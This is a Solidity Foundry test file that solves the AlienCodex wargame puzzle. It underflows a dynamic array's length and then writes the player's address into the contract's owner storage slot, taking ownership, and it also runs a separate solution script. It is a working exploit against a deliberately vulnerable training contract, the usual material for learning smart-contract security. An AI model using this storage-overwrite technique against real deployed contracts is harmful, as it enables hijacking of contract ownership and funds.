// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {LegacyDeployer} from "../LegacyDeployer.sol";
import {IAlienCodex} from "@puzzles/19/IAlienCodex.sol";
import {AlienCodexSolution} from "../../script/19/AlienCodexSolution.s.sol";

contract AlienCodexTest is Test, LegacyDeployer {
    IAlienCodex internal puzzleContract;
    address player = msg.sender;

    function setUp() public {
        puzzleContract = IAlienCodex(_deployPuzzle19());
    }

    function testAlienCodex() public {
        vm.startPrank(player);
        assertFalse(puzzleContract.contact());
        puzzleContract.makeContact();
        assertTrue(puzzleContract.contact());
        puzzleContract.retract(); // make codex.length overflow to type.max(uint256)

        bytes32 slot = keccak256(abi.encode(1)); // alienCodex.codex[0];
        uint256 hackSlot = type(uint256).max - uint256(slot) + 1;
        bytes32 overrideValue = bytes32(abi.encodePacked(bytes12(uint96(1)), bytes20(player)));
        puzzleContract.revise(hackSlot, overrideValue);

        assertEq(puzzleContract.owner(), player);

        console.logBytes32(vm.load(address(puzzleContract), 0));

        vm.stopPrank();
    }

    function testAlienCodexSolution() public {
        AlienCodexSolution solution = new AlienCodexSolution();
        solution.solve(address(puzzleContract), player);
        assertEq(puzzleContract.owner(), player);
    }
}